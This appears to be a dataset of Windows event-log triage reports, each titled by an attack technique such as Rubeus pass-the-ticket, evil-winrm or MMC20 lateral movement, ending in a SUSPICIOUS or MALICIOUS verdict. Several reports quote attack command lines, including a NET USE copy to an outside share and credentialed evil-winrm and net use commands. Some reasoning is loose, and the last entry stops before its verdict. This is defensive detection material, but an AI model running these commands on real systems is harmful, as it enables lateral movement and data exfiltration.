Enable Windows Remote Management,"Upon reviewing the provided Windows event logs, we observe a range of activities occurring on the host identified as ""Server002"". Here’s a detailed analysis focusing on potential indicators of malicious activity:

1. **Application Log**:
   - An event related to Windows Defender being in the ""SECURITY_PRODUCT_STATE_ON"" indicates that Windows Defender Antivirus is active and functioning. This is typically a benign status update indicating the antivirus protection is enabled.

2. **Windows PowerShell Log**:
   - A series of events indicate the execution of a PowerShell command: `powershell.exe & {Enable-PSRemoting -Force}`. The `Enable-PSRemoting` command is used to enable remote management of the system via PowerShell, which can be legitimate in IT administrative scenarios. However, if unexpected, especially with the `-Force` parameter, it may suggest a deviation from standard operating procedures and warrants further scrutiny.
   - Repeated executions of providers such as Registry, Alias, Environment, FileSystem, and others link to a PowerShell session that was initiated using the above command. This can be normal during a remoting setup but must align with intended administrative actions.

3. **System Log**:
   - The logs reflect routine actions related to Windows Update, specifically the update of security intelligence for Microsoft Defender Antivirus. This is expected in a well-maintained environment and no anomalies are detected.

4. **Security Log**:
   - Log events 4624 and 4634 show successful logon (LogonType: 3, implying network logon) and subsequent logoff events for a user named `admin_test`. The logon is through NTLM, which isn’t inherently suspicious if this activity matches expected behavior.
   - High-privileged actions (event 4672) are associated with `admin_test`, indicating they have permissions such as `SeDebugPrivilege`, `SeTakeOwnershipPrivilege`, among others. Without further context, these could be legitimate administrative privileges, but they necessitate evaluation against expected usage patterns.

5. **Sysmon Log**:
   - Events show the execution of typical system utilities like `wevtutil.exe`, `conhost.exe`, `whoami.exe`, and `hostname.exe`. These are generally non-suspicious, but seeing tools like `wevtutil` being used frequently might warrant further review to ensure they are not being leveraged for unauthorized event log manipulation.

Based on the review:
- **Suspicious Activity**: The usage of the PowerShell `Enable-PSRemoting -Force` command without additional context raises a flag. It could be intended administrative setup or unauthorized enabling of remote management. Verification of whether this aligns with the intended system configuration is required.
- **Privileged Actions**: High privileges of `admin_test` demand verification that such privileges align with their role and job function.
- **Event Log Utilization**: Regular use of `wevtutil.exe` may necessitate checking with IT to confirm it aligns with logging or monitoring scripts or maintenance activities.

### Assessment:
**Resolution: SUSPICIOUS**
While no definitive malicious actions are identified, the PowerShell activity and use of specific privileges could indicate a need for further investigation to ensure these actions align with authorized use and administrative intent. Further steps should include verifying intended administrative use of PowerShell remoting and reviewing policy compliance on privilege allocation. Additionally, consider a broader context from networking or other log sources to ensure a comprehensive analysis."
PowerShell Lateral Movement using MMC20,"Upon analyzing the provided logs, there are several observations and analyses that need to be considered:

### Windows PowerShell Log Analysis:
- **PowerShell Command Execution:** There's a command line indicating the execution of `calc.exe` using PowerShell. The command: 
  ```
  powershell.exe & {[activator]::CreateInstance([type]::GetTypeFromProgID(""MMC20.application"",""localhost"")).Document.ActiveView.ExecuteShellCommand(""c:\\windows\\system32\\calc.exe"", $null, $null, ""7"")}
  ```
  - **Analysis:** This method of using PowerShell to execute a command through `MMC20.application` is not a standard practice. While `calc.exe` is generally benign, the method used here resembles a known technique for executing commands and could indicate a potentially malicious intent if not authorized.

### Sysmon Log Analysis:
- **Process Creation:** The logs show the creation of typical Windows processes such as `wmiprvse.exe`, `wevtutil.exe`, `conhost.exe`, `hostname.exe`, `whoami.exe`, and `calc.exe`.
  - **Calc.exe Execution:** This was executed by `mmc.exe`, aligning with the PowerShell execution noted in the PowerShell log.
  - **WMI Provider Host (`wmiprvse.exe`)**: Execution looks standard as it’s under the SYSTEM user context and with appropriate arguments (-Embedding).
  - **Unexpected Operations:** No highly unusual or suspicious processes noted outside the execution pattern already highlighted.

- **Use of Wevtutil by Admin_test:** The usage of `wevtutil.exe` with the user `admin_test` could be indicative of log querying or clearing activities, often linked to obscuring malicious actions. This requires verification to ensure legitimacy.

### System Log Analysis:
- **Windows Updates and Defender Updates:** Windows Defender update-related processes (`wuauclt.exe`, `AM_Delta.exe`, `MpSigStub.exe`) are observed, indicating that the system might be updating its security definitions.

### Security Log Analysis:
- **Admin User with Privileges:** Logs reveal an admin user `admin_test` logging on (`EventID 4624`) with elevated privileges (`EventID 4672`). This aligns with normal operations; however, these privileges (like `SeDebugPrivilege`) can be leveraged for malicious activities if not under strict access control and monitoring.
- **Credentials Reading (EventID 5379):** These events occur several times attempting to read credentials for `MicrosoftAccount:user=02txoixylodcstop`. The multiple failures could suggest suspicious activity if accidental access failures are ruled out.

### Conclusion and Recommendation:
- **Resolution:** **SUSPICIOUS**
- **Rationale:** The method of running `calc.exe` via PowerShell, the non-standard use of `MMC20.application` for executing shell commands, and the associated high privileges of the `admin_test` account signify potential misuse or unauthorized actions needing deeper investigation.
- **Next Steps:**
  1. Verify the legitimacy of the `PowerShell` command execution. Determine if this action was authorized or part of any legitimate automation script.
  2. Confirm the purpose and authorization of the `wevtutil.exe` activity under `admin_test`.
  3. Review user `admin_test` activities to analyze any potential abuse of privileges or unauthorized actions.
  4. Increase monitoring on the system for similar patterns and potential privilege abuse, employing alerting on unexpected use cases.
  5. Conduct a security review/audit on access control policies for accounts possessing privileges like `SeDebugPrivilege`.

Further forensic analysis, possibly including a review of associated network traffic or endpoint visibility solutions, may be warranted to rule out compromise."
Exfiltration Over SMB over QUIC (NET USE),"Based on the provided windows event logs, here is a detailed analysis highlighting potentially suspicious or anomalous activity:

### Analysis:

- **Time Synchronization:**
  - The system log entries indicate normal time synchronization activities without any anomalies. Both the kernel general and time service logs document time updates in close sequence, suggesting typical system time adjustments.

- **Process Execution:**
  - The Sysmon logs show multiple executions of standard Windows utilities and services like `wevtutil.exe`, `conhost.exe`, `whoami.exe`, `powershell.exe`, and `MicrosoftEdgeUpdate.exe` by a user with 'admin_test' credentials. 
  - Their execution contexts seem to be normal, given these are standard utilities often used for legitimate administrative purposes.

- **PowerShell Activity:**
  - The PowerShell logs report the execution of a PowerShell command involving network resource access and file copying:
    ```
    powershell.exe & {NET USE * '\\\\example.com\\sales' /TRANSPORT:QUIC /SKIPCERTCHECK copy 'C:\\path\\to\\file.txt' '*:\\'}
    ```
  - While the command does attempt to use QUIC to connect and potentially skip certificate checks, which can be a technique used in unauthorized data exfiltration, there isn’t enough contextual information to determine if this is a normal operation (like a script for administrative automation) or malicious activity. The presence of clear command structure with `copy` can be used for data transfer internally.

- **Edge Update Activity:**
  - Multiple entries for `MicrosoftEdgeUpdate.exe` and its related components show installations and updates which are common maintenance activities for keeping up software patches and updates.

- **Security Log:**
  - The security log shows timestamp synchronization events. There is no indication of failed login attempts, privilege escalation, or other forms of suspicious account behavior.

### Assessment and Conclusion:

Based on the logs:
- **Network and System Commands:** The Powershell and Sysmon logs show command executions that suggest an administrative task or script. Although command-line arguments like `/SKIPCERTCHECK` within the `NET USE` command can be used suspiciously, there isn't sufficient evidence to confirm malicious intent without additional context or corroborating evidence.
- **Update Activities:** The frequent execution of `MicrosoftEdgeUpdate.exe` with various arguments associated with Edge auto-update processes appear legitimate.

### Resolution:

- **Resolution: SUSPICIOUS**

The activities observed in the PowerShell execution log, specifically the use of `/SKIPCERTCHECK` in combination with a file copy operation, warrant further investigation to confirm whether they are sanctioned administrative tasks or unauthorized actions. It would be prudent to verify if the scripts in question are authorized and what files were accessed or copied.

### Guidance:

- **Log Correlation:** Investigate associated network logs or file system changes around the timestamps of the PowerShell command execution to corroborate legitimacy.
- **Security Audit:** Ensure the `admin_test` user account’s activity matches their role and permissions.
- **Anomaly Detection:** Set up alerts for commands using `/SKIPCERTCHECK` or those involving sensitive data unless explicitly allowed."
Execute command writing output to local Admin Share,"Upon analyzing the provided Windows event logs, several observations and assessments are as follows:

### System Log Analysis:
1. **Registry Hive Resizing**: 
   - Event ID 15 indicates a registry hive being resized, which is a normal system operation and usually not suspicious.
2. **Time Synchronization Events**:
   - Event IDs 24 and 1 in the System log show that the system time was adjusted. This could potentially indicate tampering with system time, especially if not expected, but could also be legitimate time synchronization with a trusted source (time.windows.com).

### Security Log Analysis:
1. **Time Change Event**:
   - Event ID 4616 in the Security log corresponds to a system time change, executed by `svchost.exe`. If this is part of normal operation, it's usually benign, but if unexpected, requires further scrutiny.
2. **Credential Validation Failures**:
   - Multiple Event ID 5379 indicate credential validation attempts, all returning code 3221226021, which corresponds to STATUS_NO_SUCH_LOGON_SESSION. This can appear suspicious if these attempts are unexpected for the logged timeframe.

### Sysmon Log Analysis:
1. **Process Execution Events**:
   - Multiple process executions (Event ID 1 and 5) are logged, showing legitimate system processes like `wevtutil.exe`, `conhost.exe`, `hostname.exe`, and `cmd.exe`.
   - Notably, commands executed like ""host.exe"" followed by cmd.exe execution could indicate potential scripting or administrative tasks. `cmd.exe` is used to execute further commands, with one specific instance forwarding output to `\\127.0.0.1\ADMIN$\output.txt`. This behavior is potentially suspicious if not part of expected tasks or automated maintenance scripts.

### Application Log Analysis:
- The Windows Defender event indicates it is active (SECURITY_PRODUCT_STATE_ON), suggesting that the system's built-in antivirus is operational.

### Assessment:
- **Time Change Events**: If unexpected, this could indicate an attempt to manipulate logs or confuse log analysis. Needs verification against expected behavior and policies concerning time synchronization.
- **Credential Access Failures**: Unusual if administrative actions requiring access to credentials weren't part of the plan. These failed accesses may need closer inspection to ascertain the context and source.
- **Command Execution (e.g., cmd.exe)**: Transferring output using `\\127.0.0.1` suggests an attempt to redirect output locally, which could be expected in scripts but should be cross-verified with expected tasks.

### Resolution:
- **Resolution**: SUSPICIOUS
- **Rationale**: 
  - While several activities can be interpreted benignly within a certain context (e.g., security updates, legitimate administrative tasks), the time changes and credential failures present atypical behavior warranting further investigation.
- **Recommendation**: 
  - Review system policies and administrative activity logs to verify the legitimacy of time adjustments and command executions.
  - Investigate credential validation attempts to ensure they are not part of a brute-force or enumeration attack.
  - Monitor subsequent activities on this system for any escalation or additional anomalies. Consider setting up alerts for similar events in the future.
"
Rubeus Kerberos Pass The Ticket,"Upon detailed review of the provided logs, several suspicious activities stand out, indicating potential malicious behavior:

1. **PowerShell Execution:**
   - The logs show execution of a complex PowerShell script using `psexec.exe`, a tool typically used for executing processes on remote systems. The command arguments include executing `rubeus.exe`, which is a known tool used for Kerberos attacks such as ticket harvesting or pass-the-ticket attacks (`asktgt`, `asktgs`, `/ptt`, `purge`).
   - The `rubeus.exe` tool being run with specific flags for extracting Kerberos tickets (`asktgt` and `asktgs`) strongly suggests an attempt to exploit Kerberos for unauthorized access or lateral movement within the network.

2. **PsExec Usage:**
   - The presence of `PsExec.exe` and its associated service `PSEXESVC` being installed and started on the host suggests remote code execution, which could be part of a lateral movement strategy, especially since the file is executed with `-accepteula`, bypassing the need for user interaction.

3. **High Integrity Level:**
   - The executed processes, including `psexec.exe` and `rubeus.exe`, were launched with a high integrity level, indicating administrative access, and thus, potential privilege escalation.

4. **Suspicious Process Activity:**
   - There are numerous Sysmon logs indicating processes such as `psexec`, `conhost`, `powershell`, and `rubeus` being executed in succession on the system, which align with commonly used techniques for network infiltrations and persistence.

5. **Unusual Network and Security Behavior:**
   - The Windows Defender logs show the security product was consistently in the `SECURITY_PRODUCT_STATE_ON`, which could be a normal indication unless tampering was done to ensure monitoring was bypassed during the activity timing (even though no explicit tampering is shown in the logs).

**Assessment:**
Considering these points, the events logged in the PowerShell, Sysmon, and System logs reflect behaviors consistent with known malicious techniques such as lateral movement, privilege escalation, and credential dumping. Tools like `PsExec` and `Rubeus` are associated with penetration testing and exploitation.

**Resolution: MALICIOUS**
The activities observed, including the execution of `rubeus.exe` with Kerberos flags and the use of `PsExec.exe`, are clear indicators of a targeted attack exploiting Kerberos and reconducting lateral movement within the network. Immediate action is recommended.

**Recommendations:**
1. **Immediate Containment:** Isolate the impacted system (Server002) from the network to prevent further compromise and lateral spread.
2. **Credential Audit:** Reset credentials for possibly compromised accounts, especially `admin_test` and the local `Administrator`.
3. **Comprehensive Threat Hunt:** Conduct a wider network investigation for similar activity, checking other systems for signs of PsExec and Rubeus usage.
4. **Review Access Logs:** Analyze domain controller logs for any signs of unusual Kerberos activity or ticket requests.
5. **Patch Management:** Ensure all systems are up-to-date with patches to prevent exploitation of known vulnerabilities.
6. **Improve Monitoring:** Enhance logging and monitoring configurations to detect similar activities in the future, with a focus on PowerShell script blocking and alerting on known hacking tool use."
Remote Code Execution with PS Credentials Using Invoke-Command,"Upon reviewing the provided logs, I have identified several key aspects that could be of interest for our investigation:

1. **Privilege Usage**:
   - Event ID 4672 indicates that the user `admin_test` was granted a range of high-level privileges. These include `SeDebugPrivilege`, `SeSecurityPrivilege`, and others, which are often associated with administrative or system-level rights. While this may be normal for an admin account, it's important to confirm that such rights are required for routine operations.
   
2. **Process Execution**:
   - There are multiple logs in the Sysmon log indicating the execution of `wevtutil.exe` (Event ID 5, Process Creation). This utility is used for exporting, archiving, and clearing logs. If `admin_test` is performing log management, this might be expected; however, it could also indicate log tampering if not authorized.
   - A PowerShell session has been initiated with `Enable-PSRemoting -Force`, followed by `Invoke-Command -ComputerName $env:COMPUTERNAME -ScriptBlock {whoami}`. This suggests that remote PowerShell commands are being executed on the host. This activity is risky if not part of authorized administrative tasks.

3. **Anonymous Logins**:
   - Event ID 4624 shows `ANONYMOUS LOGON` with `LogonType` 3 (network logon). This can be legitimate in cases where services need anonymous access, but can also be suspicious if not expected in this context.

4. **Windows PowerShell Logs**:
   - The PowerShell logs detail registry and alias provider events triggered by a high-level PowerShell application. This coincides with the suspicious PowerShell command noted earlier, which may suggest script execution or configuration changes.

5. **Security Updates**:
   - The system logs indicate that a security intelligence update for Microsoft Defender Antivirus was successfully applied. This shows the system is receiving updates, which is positive.

**Assessment**:
- **SUSPICIOUS**:
   - The combination of high-level privilege usage by `admin_test`, the use of `wevtutil.exe`, and the PowerShell command execution represent potentially risky activities that require further investigation. These actions, if found to be unnecessary for regular operational tasks, could indicate an attempt to gather information or modify the system's audit trail.

**Recommendations**:
- Validate the necessity of privileges and processes used by the `admin_test` account. Ensure such use complies with internal policies.
- Investigate the context and necessity of the PowerShell commands, and confirm them with the respective administrative team. Assess if Enable-PSRemoting and the subsequent command were part of valid administrative actions.
- Review firewall and network security configurations to minimize the risk of unauthorized anonymous network logins.
- Consider enhancing monitoring mechanisms to flag excessive privilege use and unusual command execution for timely alerts and interventions.

These actions will help ascertain whether the observed activities were authorized and expected, or if they warrant further scrutiny."
Disable NLA for RDP via Command Prompt,"After conducting a meticulous analysis of the provided Windows event logs, here are the findings related to any indicators of suspicious or malicious activity:

### Detailed Analysis

**1. Time Changes:**
   - Multiple event logs show time changes by the system.
   - Logs `EventID: 1` and `EventID: 24` in the System log indicate time adjustments made by `svchost.exe`. Normally, time changes can be benign and attributed to time synchronization services. However, frequent and unexplained time changes can sometimes be used to manipulate logs or evade detection timelines.
   - The changes are orchestrated by a legitimate Windows service (`svchost.exe`), which typically handles time synchronization.

**2. EventID 4624 and 4672 in Security Logs:**
   - Successful login event (`4624`) and special privileges assignment event (`4672`) for the user `admin_test` from a workstation named `DESKTOP-3HL5B2P`.
   - The `LogonType: 3` indicates a network logon, which is normal for remote connections.
   - The privileges included some sensitive ones like `SeDebugPrivilege`. This can suggest a possibility of privilege escalation if not explicitly required for normal operation.

**3. Cmd.exe and Registry Modifications:**
   - A specific command was executed using `cmd.exe` to modify the registry (`reg.exe`) to disable RDP user authentication: `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp\UserAuthentication /v /d 0`
   - Registry changes involving RDP settings, especially those that weaken authentication, are indicative of an attempt to modify remote access settings potentially maliciously.

**4. Legitimate Software Updates:**
   - Multiple Sysmon entries detail the execution of legitimate system processes such as `wuauclt.exe` and `AM_Delta.exe` related to Windows and Microsoft Defender updates.
   - These activities follow a normal pattern, aligning with scheduled updates.

**5. Hostname.exe and Whoami.exe Usage:**
   - The use of `hostname.exe` and `whoami.exe` is benign unless there are other indicators corroborating suspicious activity. In this context, there is no direct tie to malicious activity.

### Conclusion

Though various logs demonstrate normal system operations, the specific registry modification related to RDP without a clear, justified reason stands out as potentially suspicious behavior, especially in combination with changes to privileged access. This action could be indicative of an attempt to ease unauthorized remote access while keeping logs legitimate to the untrained eye.

### Final Assessment
- **Resolution: SUSPICIOUS**

### Guidance on How to Proceed
1. **Investigate User `admin_test`:** Confirm the legitimacy of administrative access and actions.
2. **Audit Recent Activities:** Specifically look for unauthorized access attempts or other security events around this timeline.
3. **Verify the Necessity of Privileges:** Check if the `SeDebugPrivilege` and other sensitive privileges are necessary for this user.
4. **Review Intentions of Registry Changes:** Determine if the registry modification was sanctioned and aligned to an organizational policy or change request.
5. **Prevent Further Unauthorized Execution:** Consider rolling back the registry change if it deviates from standard secure configurations, and ensure remote access settings have not been tampered with to allow unauthorized entry."
crackmapexec Pass the Hash,"Upon reviewing the provided Windows event logs from various sources (Application log, Security log, System log, Sysmon log, and PowerShell log), the following observations and analysis have been made:

### Observations and Analysis:

1. **Time Manipulation:**
   - There are multiple instances in the logs where the system time is adjusted backward. This is evident in the Security log, especially with events 4616 where the `PreviousTime` and `NewTime` fields indicate a backward adjustment.
   - This could indicate an attempt to alter system time to evade detection based on timestamps or to overlap malicious activity with legitimate logs to obscure traces.

2. **Privilege Escalation:**
   - Event 4672 in the Security log lists a variety of high-level privileges being assigned to the user `admin_test`. Privileges such as `SeDebugPrivilege` and `SeTakeOwnershipPrivilege` can be sensitive and are often more than typical for standard user operations, indicating potential privilege escalation activities.

3. **Suspicious Command Execution:**
   - The Sysmon log records the execution of `cmd.exe` with a command that includes `crackmapexec.exe`, a known penetration testing tool. The command attempts to use NTLM hash credentials, which suggests attempts at pass-the-hash attacks or lateral movement.
   - Services and applications such as `pscmd.exe`, `conhost.exe`, and `whoami.exe` appear in the logs, substantiating potential enumeration or execution chains commonly observed in penetration testing or malicious operations.

4. **Presence of Unknown or Misleading Processes:**
   - Some entries show processes with `<unknown process>` in the Sysmon log, which is uncommon and might be indicative of hidden or obfuscated activities.

5. **Frequent Execution of Edge Update Processes:**
   - Multiple EdgeUpdate process executions are noted, which in themselves aren't typically suspicious. However, consistent high frequency within a narrow timeframe merits further examination to ensure they are as innocuous as they claim to be.

6. **Usage of Network and System Services:**
   - Multiple service restarts and process executions related to Microsoft services like EdgeUpdate operate under the `NT AUTHORITY\SYSTEM` context, which is generally benign but might require correlation with other suspicious activities.

### Assessment:

Based on the observations, there are significant indications of suspicious activity within the logs:
- The time rollback attempts suggest subversion of logging timelines.
- The privilege elevation for `admin_test` and use of penetration testing-like tools points towards potential misuse or compromise.
- Unusual process spawning patterns and execution of known security tools reveal a need for a more in-depth investigation to correlate these activities with legitimate administrative actions.

### Resolution:
- **Resolution:** SUSPICIOUS

### Guidance on How to Proceed:
1. **Detailed Investigation:**
   - Investigate the purpose and necessity of time changes and correlate with other security incidents or administrative activities during the same period.
2. **User Activity Analysis:**
   - Conduct a deeper review of all activities performed under the `admin_test` account to check for unauthorized access or alteration of privileges.
3. **Network and System Monitoring:**
   - Enhance monitoring of network traffic for unusual patterns and external connections that might confirm lateral movement or data exfiltration.
4. **Malware Scan:**
   - Perform comprehensive malware and security scans on Server002 to uncover any hidden threats or rootkits not captured in the logs.

The above steps will help confirm whether malicious activity took place and what actions are necessary to secure the system moving forward."
WinRM Access with Evil-WinRM,"### Detailed Analysis of Windows Event Logs:

### Security Log Analysis:
- **Event ID 5379**: This event indicates failure attempts to read the credentials for `MicrosoftAccount:user=02txoixylodcstop`. The `ReturnCode` `3221226021` suggests that it was a logon failure due to unknown user name or bad password. However, continuous attempts (multiple instances in a short period) to access a particular account can indicate brute force attempts, credential stuffing, or misuse of Microsoft Account credentials.

- **Event ID 4624**: This event logs successful logons. Notably, the logon type `5` refers to a service logon, typically automated and doesn't present immediate human interaction concerns unless in combination with other suspicious activities.

- **Event ID 4672**: Indicates that accounts with special privileges logged on. The presence of the `SeDebugPrivilege` and other high-risk access privileges indicates an account with extensive rights, common on systems but potentially concerning if combined with other malicious behavior.

### Sysmon Log Analysis:
- **Event ID 1**: Notably, a PowerShell session is initiated with the command line indicating usage of `evil-winrm`, which is a known tool used for exploiting Windows Remote Management for remote code execution. The command used:
  - `""powershell.exe"" & {evil-winrm -i Target -u Domain\Administrator -p P@ssw0rd1}`
  This clearly indicates malicious activity attempting to leverage Windows credentials in an unauthorized manner.

- **Process Executions**: Multiple instances of administrative-level processes like `sc.exe`, `rundll32.exe`, and `rundll32.exe` are seen, which can be normal, but in the context of the `evil-winrm` usage, raises a red flag.

### Windows PowerShell Log Analysis:
- **Event ID 600**: Logs show PowerShell is leveraged with the `evil-winrm` as a host application. This is consistent with attempts to perform unauthorized remote management actions and aligns with the malicious `Sysmon` entries.

### Risk and Threat Assessment:
- **Malicious Activity Detected**: The combination of failed login attempts to a Microsoft Account, high-privilege service logins, and specific malicious tool usage (evil-winrm) denotes a strong indicator of compromise.
- The use of `evil-winrm` shows a potential threat actor attempting to gain or maintain unauthorized access, highlighting a system potentially compromised or under attack by malicious actors targeting credentials for further exploits.

### Resolution: MALICIOUS

### Guidance on How to Proceed:
1. **Immediate Containment**: Disconnect the affected host from the network to prevent further unauthorized access or data exfiltration.
2. **Credential Audit**: Examine and reset credentials involved, especially `admin_test` or any other accounts evident from logs.
3. **Investigate and Patch Exploits**: Review and patch any disclosed vulnerabilities, particularly those related to Windows Remote Management or PowerShell configurations.
4. **Full forensic Analysis**: Undertake comprehensive system and network forensics to determine the impact and extent of unauthorized access or data compromise.
5. **Implement Monitoring**: Enhance logging and real-time monitoring to spot and address any further unauthorized activities swiftly.
6. **User and Admin Awareness Training**: Sensitize users and administrators about credential misuse and the need for enhanced security practices, such as multi-factor authentication where possible."
Invoke-WMIExec Pass the Hash,"Upon reviewing the provided logs, several points stand out as indicators of potentially malicious activity:

1. **Unusual PowerShell Activity:**
   - The execution of PowerShell commands with suspicious command lines, particularly the attempt to execute a script from a GitHub URL that is known for containing a tool (`Invoke-WMIExec.ps1`) commonly used for lateral movement and remote command execution. This indicates an attempt at remote execution using the NTLM hashes, which is indicative of Pass-the-Hash attacks. 
   - Event ID 1 in the Sysmon log confirms a high-integrity level execution of PowerShell with potentially malicious command-line arguments.

2. **Indicators in the Windows PowerShell Log:**
   - Multiple entries showing the execution of PowerShell with a focus on downloading and executing a script from a remote source. This behavior is considered suspicious as it can lead to the execution of unauthorized or malicious scripts.

3. **Connections to Authentication Bypass Techniques:**
   - The use of the `-Command hostname` parameter in PowerShell script download activity seems to indicate an attempt to establish connectivity and execute commands remotely using administrative privileges.

4. **Anomalous Time Changes:**
   - Security logs show an unusual backward time adjustment (`EventID: 4616`). Time changes on systems are often associated with evasion techniques, such as reverting timestamps on forensic logs to hide malicious activity or reverse logs to reset the security logs' chronological order.

Based on the points highlighted, I'll classify this activity as **MALICIOUS**. The Sysmon and Windows event logs show a high probability of an attempted or successful compromise through remote execution and credential misuse.

**Guidance on How to Proceed:**

- Immediately isolate the compromised system to prevent lateral movement within the network.
- Conduct a forensic investigation to identify any persistence mechanisms or payloads that may have been deployed.
- Review and audit privileged account activities to identify unauthorized access or changes.
- Enhance monitoring and alerting for use of suspicious PowerShell executions and remote script downloads.
- Educate users, especially IT and admin users, on secure credential handling and the dangers of storing or transmitting password hashes.
- Consider resetting or rotating credentials that may have been exposed."
Map admin share,"After reviewing the provided logs, let's break down the analysis by event type to identify any suspicious or potentially malicious activity.

### System Log Analysis
The system logs are showing regular Windows Update activities related to Security Intelligence Updates for Microsoft Defender Antivirus. Updates have been installed successfully, which is a typical and benign operation.

### Sysmon Log Analysis
The Sysmon logs indicate several process creations. These include the use of `wevtutil.exe`, `conhost.exe`, `HOSTNAME.EXE`, `whoami.exe`, and some command-line activities that need attention:
- `wevtutil.exe` and `conhost.exe` are standard system utilities but are sometimes used in combination with malicious scripts for log management or obfuscation. Their presence alone is not alarming unless accompanied by other suspicious activity.
- The creation of a `cmd.exe` process with a command line `\""cmd.exe\"" /c cmd.exe /c \""net use \\\\Target\\C$ P@ssw0rd1 /u:DOMAIN\\Administrator\""` stands out as suspicious. This indicates an attempt to map a network drive using administrative privileges, which could suggest lateral movement or unauthorized access.
- The use of `whoami.exe` and `hostname.exe` are benign on their own, often used to gather system information.

### Application Log Analysis
Only one event entry is visible, confirming that Windows Defender is in a secured state. This is a benign event.

### Security Log Analysis
- The logs show that the user `admin_test` has logged in using NTLM, and has a session with elevated privileges (`SeSecurityPrivilege`, `SeBackupPrivilege`, etc.). While these privileges are typical for an admin, their use should be justified by regular activities.
- The consistent elevation and usage pattern for `admin_test` is something to monitor, especially in combination with the aforementioned network drive mappings.

### Summary
Most events appear normal in routine operations, such as security updates and regular system executions, even including information gathering commands like `whoami`. However, the use of `net use` with administrative credentials from a command prompt is atypical and might indicate potential unauthorized access attempts or lateral movement techniques.

### Resolution
- **SUSPICIOUS**: The prime indicator here is the command that maps a network drive using admin credentials, which needs further investigation. Verify if this activity was expected or if it's part of routine operations. Check for any additional signs of policy violations or unauthorized activity on the network share referenced.

### Guidance
1. **Verify User Intent**: Contact the user `admin_test` and verify whether the `net use` command was part of a legitimate activity.
2. **Review Network Activity**: Examine network logs to see if there has been any suspicious access to the shares or unusual data transfers post this event.
3. **Audit Privileges**: Ensure that the privileges granted to `admin_test` align with their responsibilities and are necessary for their tasks.
4. **Strengthen Monitoring**: Consider deploying or tightening endpoint detection and monitoring controls to catch similar activities in the future.

By addressing the outlined suspicious activities, you can ensure the host's security posture is maintained and mitigate potential unauthorized access or data breaches."
Radmin Viewer Utility,"Upon reviewing the provided set of Windows event logs, the following observations were made:

### Suspicious or Anomalous Behavior
1. **Unusual File Paths and Temporary Directories**: The execution of `MicrosoftEdgeUpdate.exe` and related components from the temporary directory `C:\Program Files (x86)\Microsoft\Temp\EUA29F.tmp\` raises suspicion. Software updates generally execute from more standardized paths, especially for legitimate applications like Microsoft Edge. Temporary directories are frequently used locations for executing feigned legitimacies or executing attacks.

2. **Execution Context**: Several processes, such as `MicrosoftEdgeUpdate.exe` and `powershell.exe`, were executed under the `NT AUTHORITY\SYSTEM` or `SERVER002\admin_test` user contexts, both of which have elevated privileges and could be used to perform unauthorized actions.

3. **PowerShell Executions**: While PowerShell is a common administrative tool, the execution of `powershell.exe` by non-interactive users or within unusual contexts may need scrutiny, as PowerShell can be used for executing scripts that could result in system compromise.

4. **Command Line Execution of Third-party Software**: The invocation of `cmd.exe` to run `Radmin.exe` (a remote administration tool) is noteworthy. Although Radmin may be legitimate, unauthorized or unexpected installations of remote tools can serve as a backdoor for attackers. The full path is not completely visible, which adds a layer of uncertainty and potential risk. This deserves further scrutiny.

5. **Process Execution Sequence**: There is a sequence of processes including `conhost.exe`, `wevtutil.exe`, and PowerShell, running in close time frames and under the context of `admin_test`, which could indicate lateral movement, log manipulation, or preparation of an environment for attacks.

### Indicators of Malicious Activity
- **Multiple Executions of MicrosoftEdgeUpdate**: While frequent updates or component checks by legitimate update services can occur, the erratic logging and behavior here (especially from temp directories) raise questions of validity and intentions.
- **Wevtutil.exe Utilization**: This utility can be used maliciously to clear logs, hide traces of an attack or alter logs, although there's no direct evidence that it was utilized for malicious purposes here, the context remains suspect.

### Assessment
Based on the points outlined, while concrete evidence of malicious compromise has not been clearly deduced purely from the current logs, the use of temporary directories, command line executions resembling those often used in malicious scenarios, alongside common administrative pathways, collectively bear a potential risk profile often associated with reconnaissance or unauthorized use.

### Resolution
**SUSPICIOUS**

### Guidance on Proceeding
1. **Further Investigation**: Recommend a deeper dive, focusing on the command lines, inspecting changes occurring in those directories, and checks for unauthorized software installations and subsequent file manipulations during the event timeframe.
2. **Check PowerShell Logs**: Getting the additional PowerShell logs (if any) could help identify any scripts or particular behaviors executed.
3. **Verify MicrosoftEdgeUpdate**: Ensure that the pending updates or installations are genuine, checking the files against known good signatures and company internal update policies.
4. **Monitor User Accounts**: Scrutinize the actions associated with `SERVER002\admin_test` around this period to ensure that these were authorized actions.

Ensure real-time monitoring and regular audit logging to preempt any further uncertainty and protect systems proactively."
Map Admin Share PowerShell,"### Analysis of Windows Event Logs

**1. System Logs:**
- **Time Adjustments**: The system logs show multiple adjustments of the system time, which can be normal in some circumstances like correcting time drift with NTP servers. However, frequent or unusual time changes can sometimes indicate an attempt to tamper with log timestamps to hide malicious activities. In this case, two entries (EventID 1) show adjustments made by `svchost.exe` which is often used for legitimate time synchronization.
  
- **Windows Update**: Entries related to the Windows Update Client (EventID 43 and 44) show security intelligence updates being applied. This indicates routine updates and suggests that the Windows Defender is current, which is a good security practice.

**2. PowerShell Logs:**
- **New-PSDrive Command**: There are multiple PowerShell sessions started, with the command `New-PSDrive -name g -psprovider filesystem -root \\Target\C$`. This command is used for mounting network drives and could suggest an attempt to access shared resources. If this activity was not sanctioned or expected, it could suggest lateral movement preparations or unauthorized access attempts.

**3. Sysmon Logs:**
- **Use of System Tools**: Execution of tools like `wevtutil.exe`, `conhost.exe`, `wbem`, `hostname.exe`, `whoami.exe`, and `powershell.exe` is logged. While they are legitimate, their use together can sometimes suggest reconnaissance or privilege enumeration activities. Special note on `whoami.exe` — often used by attackers to check user permissions if not initiated by the user.
  
- **Microsoft Edge Update**: A series of entries log the update of Microsoft Edge, which appears benign and a normal scheduled task.

**4. Security Logs:**
- **Logons and Privileges**: The security events show normal logon and logoff procedures for a user `admin_test`, with some high-level privileges granted. EventID 4672 and 4624 show administrative privileges that include `SeDebugPrivilege` and `SeBackupPrivilege`, among others — these should be monitored if unexpected.

- **SAM/LSA request for authentication**: EventID 5379 shows unsuccessful attempts to read credentials. This could be an indication of failed attempts to access secure information, and though the result was a `Return Code` of failure, it is suspicious.

### Assessment

The logs indicate a few areas of potential concern:
- The adjustment to system time by a service host process raises a flag, but it could be the result of legitimate time synchronization.
- The PowerShell command activities suggest possible unauthorized access to shared drives, and `whoami.exe` execution is often part of post-exploitation.
- The administrative privileges assigned to the `admin_test` account, which might not be normal in your environment.
- Attempts to access secure login information, though unsuccessful, warrant attention.

